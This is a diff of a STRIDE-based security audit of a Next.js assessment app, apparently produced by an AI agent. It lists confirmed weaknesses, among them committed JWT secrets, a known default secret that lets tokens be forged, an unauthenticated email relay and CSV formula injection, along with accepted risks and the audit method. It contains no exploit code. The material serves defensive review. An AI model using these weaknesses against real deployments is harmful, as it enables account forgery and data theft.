-| System owner submitting assessments as respondent | Elevation of Privilege | SAFE | `middleware/requireSessionOwner.ts:65-70` explicitly rejects `system_owner` role with `SYSTEM_OWNER_CANNOT_SUBMIT`. |
-| Respondent accessing dashboard | Elevation of Privilege | SAFE | All five dashboard routes call `middleware/requireSystemOwner.ts` which verifies `role === 'system_owner'` after signature verification. |
-| JWT forgery (without known secret) | Spoofing | SAFE | `jose` library used with `algorithms: ['HS256']` restriction; `verifyJwt` always calls `jwtVerify` with the server-side secret. |
-| Session resume IDOR | Information Disclosure | SAFE | `getSessionById` double-checks `respondent_email !== callerEmail` independently of middleware. `sessionService.ts:196-198`. |
-| Config PATCH without auth | Tampering | SAFE | Both `GET /api/config` and `PATCH /api/config` call `requireSystemOwner` before any DB access. `config/route.ts:9,34`. |
-| Dashboard CSV export without auth | Information Disclosure | SAFE | `GET /api/dashboard/export/csv` calls `requireSystemOwner` before building the stream. `dashboard/export/csv/route.ts:9`. |
-| Sections/questions data leakage to unauthenticated users | Information Disclosure | SAFE | Both section routes require a valid JWT via `jwtMiddleware` (any role). |
-| System Owner email enumeration via login response timing | Information Disclosure | SAFE | Both success (JWT issued) and failure (`NOT_A_SYSTEM_OWNER` 403) paths call `isSystemOwnerEmail` before branching; response body is structurally different but response timing is not artificially equalized. (Minor: email existence oracle exists via 403 vs 200, but within acceptable risk for this use case.) |
-| Answer payload type confusion | Tampering | SAFE | `PutResponsesBodySchema` uses Zod discriminated union on `type` field; all six types are validated with specific constraints. `answerPayload.ts:47-54`. |
-| assessmentOpenGuard bypass via DB fail-open | Denial of Service / Tampering | LOW RISK | Fail-open returns `{ ok: true }` on DB errors, but the subsequent `upsertResponses`/`finalizeSubmission` calls would also fail on DB errors. Practical bypass is not achievable via this path alone. |
-| Unbounded dashboard query results | Denial of Service | SAFE | `dashboardService.ts:21` enforces `pageSize = Math.min(100, ...)`. CSV export fetches all rows but is system_owner-only. |
-| `Content-Disposition` header injection in CSV filename | Tampering | SAFE | CSV filename is `assessment-responses-YYYY-MM-DD.csv` built from `new Date().toISOString().slice(0,10)` — no user input. `dashboard/export/csv/route.ts:14`. |
-| Path traversal in sectionId | Tampering | SAFE | `sectionId` is a text slug used only in `eq(sections.id, sectionId)` — parameterized. No filesystem operations on this value. |
+Consider logging the guard failure as a WARNING-level event and returning `{ ok: true }` with a logged metric. For high-security deployments, change to fail-closed (`ASSESSMENT_CLOSED`) when the config cannot be read, with explicit operator notification. At minimum, ensure the exception is logged (currently caught silently).
 
 ---
 
-## Summary Table
+### FINDING-09 — Unauthenticated /api/health Endpoint Leaks DB Status
 
-| ID | Severity | STRIDE | file:line | One-Line Description |
-|---|---|---|---|---|
-| FIND-01 | **CRITICAL** | Info Disclosure / Spoofing | `.env:1`, `.env.local:1` | JWT secret and DB credentials committed to git |
-| FIND-02 | **HIGH** | Spoofing | `api/notifications/email/route.ts:25` | Unauthenticated email relay endpoint |
-| FIND-03 | **HIGH** | Spoofing | `docker-compose.yml:31` | Hardcoded placeholder JWT secret shipped in compose |
-| FIND-04 | MEDIUM | Tampering | `api/responses/[sessionId]/route.ts:54` | No server-side section-membership check for question_id |
-| FIND-05 | MEDIUM | Tampering | `services/csvExportService.ts:134` | CSV formula injection in free-text answers |
-| FIND-06 | LOW | EoP | `docker-compose.yml:19` | PostgreSQL port exposed to host |
-| FIND-07 | LOW | Info Disclosure | `app/page.tsx:25`, `dashboard/login/page.tsx:42` | JWTs stored in localStorage, no CSP |
+| Field | Value |
+|-------|-------|
+| **ID** | FINDING-09 |
+| **Severity** | INFO |
+| **Category** | Information Disclosure (STRIDE: I) |
+| **Location** | `src/app/api/health/route.ts:9-33` |
+| **Status** | CONFIRMED (accepted risk — see below) |
+
+#### Description
+
+The health endpoint returns DB connectivity status without authentication:
+
+```json
+// 503 response:
+{ "status": "error", "db": "disconnected", "timestamp": "2026-08-03T..." }
+```
+
+This reveals database availability to unauthenticated callers. In isolation this is low-risk, but combined with other vulnerabilities, a persistent `db: disconnected` response tells an attacker that DB-error-based bypasses (FINDING-08) are currently active.
+
+**This is a common pattern for health endpoints** (required for container orchestration healthchecks) and is listed here for completeness. The risk is considered acceptable.
 
 ---
 
-## Remediation Priority
+## Accepted Risks
 
-1. **Immediately (pre-deploy):** FIND-01 — Remove `.env`/`.env.local` from git tracking; rotate all secrets.  
-2. **Immediately (pre-deploy):** FIND-03 — Remove hardcoded JWT_SECRET from `docker-compose.yml`; require injection at runtime.  
-3. **Before enabling email:** FIND-02 — Delete or authenticate the `/api/notifications/email` route.  
-4. **Sprint:** FIND-04 — Add server-side section-membership validation in `responseService.upsertResponses`.  
-5. **Sprint:** FIND-05 — Add formula-injection prefix escaping in `csvExportService.flattenAnswerPayload`.  
-6. **Hardening:** FIND-06 — Remove PostgreSQL port host-binding from `docker-compose.yml`.  
-7. **Hardening:** FIND-07 — Migrate JWTs to `httpOnly` cookies; add `Content-Security-Policy` header.
+| Risk | Rationale |
+|------|-----------|
+| `localStorage` JWT storage for respondents | Client-side auth is the intended architecture; mitigated by short JWT lifetime (24h) and domain-scoped keys. Fix: migrate to HttpOnly cookies (FINDING-05) in a future phase. |
+| No HSTS header | The app is deployed via HTTP internally and in Docker. HSTS should be added when TLS termination is confirmed at the edge/load balancer layer. |
+| `X-Frame-Options: SAMEORIGIN` instead of DENY | Required by the Pivota platform which embeds the app in an iframe. Comment documented in `next.config.ts:16`. |
+| Health endpoint publicly accessible | Required for `docker-compose` healthcheck and external monitoring. DB status disclosure is low risk given no sensitive data is exposed. |
+| question_id not cross-validated against session sections | A respondent can save an answer for any question UUID. The FK constraint prevents phantom questions (must exist in DB). Data would appear in the DB but not in the respondent's rendered sections. Impact: minor data pollution, no security bypass. Not exploitable to access another session. |
+| LIKE wildcard pass-through in search param | The `search` parameter is passed via `ilike` which is parameterized (no SQL injection). Leading `%` matches all records but is gated by `requireSystemOwner` auth. Acceptable under authenticated endpoint. |
+
+---
+
+## Audit Trail
+
+### STRIDE Register (Retroactive)
+
+| ID | Component | STRIDE Class | Candidate Issue | Disposition |
+|----|-----------|--------------|-----------------|-------------|
+| S-01 | `/api/auth/login` | Spoofing | Email-only auth (no password) | ACCEPTED — by design; SO email list is access control |
+| S-02 | JWT signing | Spoofing | Weak/known JWT secret | CONFIRMED → FINDING-01, FINDING-03 |
+| S-03 | `/api/notifications/email` | Spoofing | Unauthenticated email relay | CONFIRMED → FINDING-02 |
+| T-01 | `dashboardService.getResponseList` | Tampering | `sortBy` injection | SAFE — whitelist map with default |
+| T-02 | `dashboardService.getResponseList` | Tampering | `sortDir` injection | SAFE — ternary: `=== 'asc' ? asc : desc` |
+| T-03 | All services | Tampering | SQL injection via Drizzle | SAFE — parameterized queries; `ilike` confirmed parameterized |
+| T-04 | `csvExportService` | Tampering | CSV formula injection | CONFIRMED → FINDING-04 |
+| T-05 | `assessmentOpenGuard` | Tampering | Fails open on DB error | CONFIRMED → FINDING-08 |
+| T-06 | `responseService.upsertResponses` | Tampering | Save responses to any question_id | ACCEPTED — FK constraint; no cross-session access; data pollution only |
+| R-01 | `configService.patchConfig` | Repudiation | Config changes not audited | SAFE — config_audit_log table populated on every PATCH |
+| I-01 | `.env`, `.env.local` in git | Information Disclosure | JWT secret + DB creds in version control | CONFIRMED → FINDING-01 |
+| I-02 | JWT in localStorage | Information Disclosure | XSS-accessible token storage | CONFIRMED → FINDING-05 |
+| I-03 | No CSP header | Information Disclosure | XSS attack surface | CONFIRMED → FINDING-06 |
+| I-04 | `/api/health` | Information Disclosure | DB status leakage | CONFIRMED → FINDING-09 (INFO) |
+| I-05 | `POST /api/auth/login` error codes | Information Disclosure | System owner email enumeration | CONFIRMED → FINDING-07 (rate limit absent) |
+| D-01 | `POST /api/sessions` | Denial of Service | No rate limiting | CONFIRMED → FINDING-07 |
+| D-02 | `POST /api/auth/login` | Denial of Service | No rate limiting | CONFIRMED → FINDING-07 |
+| E-01 | `GET /api/dashboard/**` | Elevation of Privilege | RBAC bypass | SAFE — `requireSystemOwner` applied to all dashboard routes |
+| E-02 | `PUT /api/responses/[sessionId]` | Elevation of Privilege | IDOR (other respondent's session) | SAFE — `requireSessionOwner` middleware verifies email ownership |
+| E-03 | `POST /api/submissions/[sessionId]` | Elevation of Privilege | IDOR (other respondent's submission) | SAFE — `requireSessionOwner` middleware verifies email ownership |
+| E-04 | `lib/auth/requireSessionOwner` | Elevation of Privilege | System owner bypass (reads any session) | SAFE — service layer (`getSessionById:196`) re-validates email; SO can't match respondent email |
+| E-05 | `docker-compose.yml` JWT secret | Elevation of Privilege | Known default secret → forge system_owner JWT | CONFIRMED → FINDING-03 |
+
+### Files Read
+
+All 40 required files listed in the audit request were read in full. Additionally audited:
+- `docker-compose.yml`
+- `.env`, `.env.local`, `.env.example`
+- `next.config.ts`
+- `drizzle/seed.ts`, `drizzle/schema.ts`, `drizzle/migrate.ts`
+
+### Methodology
+
+1. Read all source files before analysis.
+2. Built STRIDE register retroactively from the implementation surface.
+3. For each HIGH/CRITICAL candidate: attempted adversarial refutation (traced user-controlled input to the sink, checked upstream guards).
+4. Confirmed findings that survived refutation; marked safe items with evidence.
+5. Verified `csv-stringify` formula injection with live node evaluation.
+6. Verified git tracking of credential files with `git ls-files`.
